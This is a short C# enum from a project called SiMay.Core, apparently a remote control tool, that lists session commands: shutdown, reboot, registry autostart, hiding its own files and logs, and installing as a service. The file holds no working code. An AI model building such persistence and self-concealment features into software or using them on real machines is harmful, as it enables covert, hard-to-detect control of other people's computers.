using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SiMay.Core
{
    public enum SystemSessionType : byte
    {
        /// <summary>
        /// 关机
        /// </summary>
        Shutdown = 0,

        /// <summary>
        /// 重启
        /// </summary>
        Reboot = 1,

        /// <summary>
        /// 注册表启动
        /// </summary>
        RegStart = 2,

        /// <summary>
        /// 取消注册表启动
        /// </summary>
        RegCancelStart = 3,

        /// <summary>
        /// 隐藏自身文件及日志
        /// </summary>
        AttributeHide = 4,

        /// <summary>
        /// 显示自身文件
        /// </summary>
        AttributeShow = 5,

        /// <summary>
        /// 退出程序
        /// </summary>
        Unstall = 6,

        /// <summary>
        /// 以服务安装
        /// </summary>
        InstallService = 7,

        /// <summary>
        /// 卸载服务
        /// </summary>
        UnInstallService = 8
    }
}
